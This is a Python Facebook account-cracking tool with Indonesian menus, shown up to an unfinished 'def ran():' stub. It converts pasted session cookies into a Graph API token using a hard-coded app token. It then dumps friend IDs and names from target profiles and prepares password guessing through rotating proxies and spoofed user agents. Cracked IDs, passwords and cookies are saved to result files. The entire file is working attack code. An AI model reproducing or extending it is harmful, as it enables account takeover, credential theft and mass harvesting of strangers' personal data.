#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.panel import Panel
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich import print as cetak
from rich.panel import Panel as nel
from rich import pretty
from rich.syntax import Syntax
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn,TransferSpeedColumn,DownloadColumn
from rich.console import Console
from rich.columns import Columns
from time import time as cok
pretty.install()
CON=sol()
## RANDOM UA

#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
tod=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m�\x1b[1;97m] [\x1b[1;96mhasim_ganz...')
prox=open('.prox.txt','r').read().splitlines()
for x in range(500):
	rr = random.randint
	rc = random.choice
	az = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	aZ = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
	a = ['2.3.6;','4.0.4;','4.2.1;','4.2','4.2.2;','4.3;','4.4.2;','4.4.4;','5.0;','5.0.2;','5.1;','5.1.1;','6.0;','6;','6.0.1;','7.0;','7.0.1;','7;','8;','8.0;','8.0.1;','9;','10;','11;','12;']
	b = ['zh-cn;','en-nz;','vi-vn;','hi-in;','en-us;','id-id;','en-gb;','ru-ru;','jap-jap;','en-ca;','es-mx;','zh-tw;','ko-kr;','th-th;','en-in;','el-gr;','tr-tr;','fr-fr;','en-ez;','zh-hk;','ar-ae;','ru-ru;','zh-CN;en-US;','fr-ch;','pt-br;','nl-nl;','gu-in;','en_US']
	
	se = f"Mozilla/5.0 (Linux; U; Android 10; en-us; MI 8 SE Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,107))}.0.{str(rr(4200,5200))}.{str(rr(30,250))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.11.4-gn"
	if se in tod:pass
	else:tod.append(se)
#	se1 = f"Mozilla/5.0 (Linux; Android 9; KFTRPWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/{str(rr(30,107))}.{str(rr(0,9))}.{str(rr(0,20))} like Chrome/{str(rr(30,107))}.0.{str(rr(4200,5200))}.{str(rr(30,250))} Safari/537.36"
#	if se1 in tod:pass
#	else:tod.append(se1)
	
def  ua_memek():
	rr = random.randint
	rc = random.choice
	az = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	return str(rc([f"Mozilla/5.0 (Linux; Android {str(rr(5,11))}; RMX2180) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,108))}.0.{str(rr(0,6000))}.{str(rr(0,150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android {str(rr(5,11))}; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,108))}.0.{str(rr(0,6000))}.{str(rr(0,150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android {str(rr(5,11))}; M2006C3LII) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,108))}.0.{str(rr(0,6000))}.{str(rr(0,150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android {str(rr(5,11))}; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,108))}.0.{str(rr(0,6000))}.{str(rr(0,150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android {str(rr(5,11))}; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(70,109))}.0.{str(rr(1000,5999))}.{str(rr(74,199))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,109))}.0.{str(rr(1000,5999))}.{str(rr(74,199))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android {str(rr(1,12))}; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(30,107))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; Redmi Note 9 Pro Max Build/QKQ1.{str(rr(111111,999999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/537.36"]))
def uaku():
	try:
		ua=open('ua.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()


#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\033[93m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([Z,N,O,U,B,K,H,M,P])
sir =random.choice([M])
try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00C8FF"
Z2 = "[#000000]" # HITAM
M2 = "[#FF005F]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

W = '\x1b[1;30m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[0;92m'
K = '\x1b[0;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
y = '\33[m'
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_table = "#00C8FF"
except FileNotFoundError:
	color_table = "#00C8FF"

#BULAN
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#TAHUN
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
#--------------------[ MENU-AWAL ]--------------#
#cetak(nel(f"""[bold green]GUNAKAN SCRIPT INI SEBAIK DAN SEWAJAR MUNGKIN,ADMIN TIDAK BERTANGGUNG JAWAB ATAS PENYALAHGUNAAN TOOLS INI,TERIMA KASIH[/]""",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]PESAN [bold red]• [yellow]• [bold green]•",style=f"yellow"))
#tree = Tree(f" [[cyan]![/]] [bold green]TUNGGU BEBERAPA SAAT UNTUK MASUK KE DALAM MENU")
#cetak(tree)
#time.sleep(0.5)
#os.system('clear')
#------------------[ MACHINE-SUPPORT ]---------------#
def YOTTAGANZZ(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
        
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
        
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-BANNER ]-----------------#
def banner():
	clear()
	cetak(nel(f''' [white]
      __                       _             
  / /  ___  __ _ _ __ _ __ (_)_ __   __ _ 
 / /  / _ \/ _` | '__| '_ \| | '_ \ / _` |
/ /__|  __/ (_| | |  | | | | | | | | (_| |
\____/\___|\__,_|_|  |_| |_|_|_| |_|\__, |
                                    |___/ 
''',style="bold blue",width=67,title='[bold green]•[bold yellow]•[bold red]•[bold green] [white] BANNER [bold green]•[bold yellow]•[bold red]•[/bold green]'))
	
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenku[0], cookies={'cookie':cok})
			basganteng = json.loads(basariheker.text)['id']
			menu(basganteng)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
		asu = random.choice([m,k,h,b,u])
		your_cookies = input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print("\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m └──\x1b[1;92mlogin gagal cookies invalid \33[m(\x1b[1;91m×\33[m)", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print("\n└── \x1b[1;92mcookies valid login berhasil");exit()
			except Exception as e:
				print("\x1b[1;92m[×\x1b[1;92m]\033[93m └──\x1b[1;92mcookies telah kadaluarsa")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	cetak(nel(f'[white][1] CRACK PUBLIK               \n[2] Masal  \n[3] FILE   \n[4] DUMP    \n[5] HASIL   \n[0] HAPUS',style="bold blue",width=67,title='[bold green]•[bold yellow]•[bold red]•[bold green] [white] MENU CRACK [bold green]•[bold yellow]•[bold red]•[/bold green]'))
	_______YOTTA_______ = input('['+p+'PILIH'+x+'] : ')
	print('')
	if _______YOTTA_______ in ['1']:
		publik()
	elif _______YOTTA_______ in ['2']:
		dump_massal()
	elif _______YOTTA_______ in ['3']:
	  crack_file()
	elif _______YOTTA_______ in ['4']:
		dump_publik()
	elif _______YOTTA_______ in ['5']:
	  result()
	elif _______YOTTA_______ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('['+p+'LOG OUT SUCCSES REMOVE COOKIES'+x+'] ')
		exit()
	else:
		print('['+p+'PILIH YANG BENER KONTOL'+x+'] ')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('>> Hasil OK Anda ')
	print('>> Hasil CP Anda ')
	print('>> Kembali	')
	kz = input('\n>> Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n╭──( PILIH ) \n╰─> : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n╭──( PILIH ) \n╰─> : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def publik():
		try:token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
		except IOError:exit()
		cetak(nel(f'[white][',style="bold blue",width=67,title='[bold green]•[bold yellow]•[bold red]•[bold green] MENU IDS [bold green]•[bold yellow]•[bold red]•[/bold green]'))
		__midlane__ = input(f"\n[{P}√{x}] Id publik : ")
		uid.append(__midlane__)
		for __colmek__ in uid:
			try:
				session = requests.Session()
				get_id = session.get(f'https://graph.facebook.com/v15.0/{__colmek__ }?fields=name,friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
				peler = get_id["name"]
				for xyz in get_id['friends']['data']:
					try:
						__data__ = (xyz['id']+'|'+xyz['name'])
						if __data__ in id:pass
						else:id.append(__data__)
					except:continue
			except (KeyError,IOError):exit(f"{P}!. Id private/tidak memiliki teman")
			try:
				cetak(nel(f'[[bold green]√[bold white]] Target name : [bold green]{peler}[bold white]\n[[bold green]√[bold white]] Jumlah[bold green]{str(len(id))}[bold white] id',style="bold blue",width=67,title='[bold green]•[bold yellow]•[bold red]•[bold green] [white] INFORMASI AKUN [bold green]•[bold yellow]•[bold red]•[/bold green]'))
				setting()
			except requests.exceptions.ConnectionError:
				exit(f"{P}!. Tidak ada koneksi")
#-------------------[ CRACK-MASSAL ]----------------#
def dump_massal():
	cetak(nel(f'',style="green",title='[bold green]•[bold yellow]•[bold red]•[bold green] MENU IDs [bold green]•[bold yellow]•[bold red]•[/bold green]'))
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('╰─>['+p+'Wann-Ganteng'+x+'] Mαυ Bҽɾαρα Tαɾɠҽƚ Wαƙ ? : '))
	except ValueError:
		print('╰─> wrong input ')
		exit()
	if jum<1 or jum>100:
		print('╰─> Failed Dump Id maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('╰─>['+p+'Wann-Ganteng'+x+'] Enter Wak the Id'+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('╰─> unstable signal ')
			exit()
	try:
		print('')
		print(f'╰─> Total Id Collected {h}'+str(len(id)))
		print(f'{x}')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('╰─> unstable signal ')
		back()
	except (KeyError,IOError):
		print(f'╰─>{k} Friendship Not Public {x}')
		time.sleep(3)
		back()
#
def crack_file():
	try:vin = os.listdir('/sdcard/ALVINO-DUMP')
	except FileNotFoundError:
		print('▶ File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ALVINO-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
		kontol = input('\n▶ Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('▶ Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('▶ Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/ALVINO-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'▶ %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('▶ %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n▶ Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}▶ Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/ALVINO-DUMP/'+geh,'r').read().splitlines()
		except:
			print('▶ File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#
def dump_publik():		
	try:
		os.mkdir('dump')
	except:pass
	try:
		xaco = input(f"{P}id public  :\x1b[38;5;46m ")
		cuy = input(f"{P}nama file  :\x1b[38;5;46m ")
		print("")
		wkwk  = ('/sdcard/ALVINO-DUMP/' + cuy + '.txt').replace(' ', '_')
		xxx = open(wkwk, 'w')
		token = open('.tok.txt','r').read()
		cookie = open('.cok.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(xaco,token),cookies=coki).json()
		for fuck in cyna['friends']['data']:
			id.append(fuck['id']+'|'+fuck['name'])
			xxx.write(fuck['id']+'|'+fuck['name'] + '\n')
			sys.stdout.write(f'\r\033[0m   %s {H}•--->\033[0m%s                  \r\n\x1b[38;5;231m [ \x1b[38;5;46m%s\x1b[38;5;231m ] [ \x1b[38;5;46m%s\x1b[38;5;231m ] \x1b[0;96mSEDANG DUMP.'%(fuck['id'],fuck['name'],datetime.datetime.now().strftime('%H:%M:%S'), len(id)
			)); sys.stdout.flush()
			time.sleep(0.0050)
			
		xxx.close()
		print(f"\nberhasil dump id dari publik");print(f"salin output file + [ %s%s%s ]"%(H,wkwk,P))
		input(f" kembali ")
		back()
	except (KeyError,IOError):
		os.remove(wkwk)
		print(f"gagal dump id, kemungkinan id tidak ada.\n")
		input(f" kembali ")
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel(f'[white][1].CRACK AKUN OLD        \n[2].CRACK AKUN NEW    \n[3].CRACK RANDOM ',style="bold blue",width=67,title='[bold green]•[bold yellow]•[bold red]•[bold green] MENU AKUN [bold green]•[bold yellow]•[bold red]•[/bold green]'))
	hu = input('['+p+'PILIH'+x+'] : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('['+p+'PILIH'+x+'] ')
		exit()
		print('')
		
	cetak(nel(f'[white][1] ASYNC        \n[2] REGULER [Close]   \n[3] VALIDATE [red][tes Metod]',style="bold blue",width=67,title='[bold green]•[bold yellow]•[bold red]•[bold green] MENU METODE [bold green]•[bold yellow]•[bold red]•[/bold green]'))
	hc = input('['+p+'PILIH'+x+'] : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	else:
		method.append('mobile')
		YOTTAGANZZ('=' * 40)
		cetak(nel(f'[white]',style="green",title='[bold green]•[bold yellow]•[bold red]•[bold green] MENU APK [bold green]•[bold yellow]•[bold red]•[/bold green]'))
	_basnih_ = input('[?] Tampilkan Aplikasi Y/t : ')
	if _basnih_ in ['']:
		print('[!] Pilih Yang Bener Lah ')
		back()
	elif _basnih_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	
	YOTTAGANZZ('=' * 40)
	cetak(nel(f'[white]APAKAH INGIN GUNAKAN PASSWORD MANUAL?',style="bold blue",width=67,title='[bold green]•[bold yellow]•[bold red]•[bold green] MENU PASSWORD [bold green]•[bold yellow]•[bold red]•[/bold green]'))
	print('')
	pwplus=input(x+'╰─>['+p+'Yotta'+x+'] y/t : ')
	print('')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel(f"Enter an additional password of at least 6 characters\nExample :[green] sayang,bagong,surabaya[white]",style="bold blue",title=" [bold green] [bold red]•[bold yellow]•[bold green]•[bold red][bold blue]Informasi Password [bold green]•[bold yellow]•[bold red]•[/bold green]"))
		pwku=input('Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	

	
#----[ BAGIAN-WORDLIST ]----#
def ran():
